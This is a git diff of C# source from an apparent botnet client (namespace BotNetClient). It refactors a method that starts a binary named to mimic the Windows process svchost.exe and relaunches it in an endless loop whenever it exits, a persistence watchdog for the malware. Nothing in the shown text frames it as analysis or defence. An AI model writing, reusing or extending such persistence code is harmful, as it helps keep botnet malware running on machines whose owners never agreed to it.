@@ -10,35 +10,31 @@ namespace BotNetClient
 {
     class SecondThread
     {
-        public static void miniprog()
+        public async static void miniprog()
         {
-
-            Process proc = new Process();
-            proc.StartInfo.FileName = Environment.CurrentDirectory + @"\svchost.exe.exe";
-            try
-            {
-                proc.Start();
-                while (true)
+            await Task.Run(()=> {
+                Process proc = new Process();
+                proc.StartInfo.FileName = Environment.CurrentDirectory + @"\svchost.exe.exe";
+                try
                 {
-                    if (!proc.HasExited)
+                    proc.Start();
+                    while (true)
                     {
+                        if (!proc.HasExited)
+                        {
 
-                    }
-                    else
-                    {
-                        proc.Start();
+                        }
+                        else
+                        {
+                            proc.Start();
+                        }
                     }
                 }
-            }
-            catch (Exception ex)
-            {
-                proc.Close();
-            }
-            finally
-            {
-                Program.miniprogram = null;
-            }
-            
+                catch (Exception ex)
+                {
+                    proc.Close();
+                }
+            });
         }
     }
 }
